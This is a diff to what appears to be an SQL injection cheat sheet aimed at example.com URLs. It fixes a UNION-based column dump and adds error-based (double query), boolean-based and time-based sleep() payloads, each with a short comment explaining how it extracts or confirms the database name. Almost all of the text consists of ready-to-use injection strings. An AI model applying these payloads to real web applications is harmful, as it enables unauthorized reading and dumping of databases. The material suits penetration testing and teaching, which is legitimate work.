@@ -14,6 +14,8 @@ http://www.example.com/?id=10\
 
 // If an error message prints or the behaviour of the website changes,
 // there's a good chance of vulnerability to SQLi.
+// There are some cases that are not so straight forward where you will
+// need to test the application behaviour for other query breakers like ".
 
 
 
@@ -105,11 +107,37 @@ http://www.example.com/?id=-10' union all select [val1, ...., group_concat(colum
 
 
 
-http://www.example.com/?id=-10' union all select [val1, ...., group_concat(column1),..., group_concat(column1), ..., valn] from [table_name] --+
+http://www.example.com/?id=-10' union all select [val1, ...., group_concat(column1),..., group_concat(column2), ..., valn] from [table_name] --+
 
 // Dump all the data from a specific table, given column names as arguments to group_concat functions.
 
 
+
+http://www.example.com/?id=10' and (select 1 from (select count(*), concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b) --+
+
+// Extract the database name through errors (double query injection) rather than printed text, can be helpful if
+// the returned data are not printed.
+
+
+
+http://www.example.com/?id=10' and (select ascii(substr(database(), 1, 1)) < val) --+
+
+// Boolean based SQLi, shows some text or so if the condition is true, doesn't show it o.w
+// Invloves the use of aggregate functions to test for string lengths or character ascii values, etc.
+
+
+
+http://www.example.com/?id=10' and sleep(val) --+
+
+// Time based SQLi, the application is still vulnerable to SQLi.
+// If the connection pauses for (val) seconds, then it's vulnerable.
+
+
+
+http://www.example.com/?id=10' and (select if((select database())='something', sleep(val), null)) --+
+
+// Actual Time based SQLi to check if the database name is equal to 'something', the connection will hold
+// for 'val' seconds then execute.
 
 /*Note: Some codes don't surround the inputs with quotes, thus some injections may not work unless we strip them
 from the single quotes used to test. */
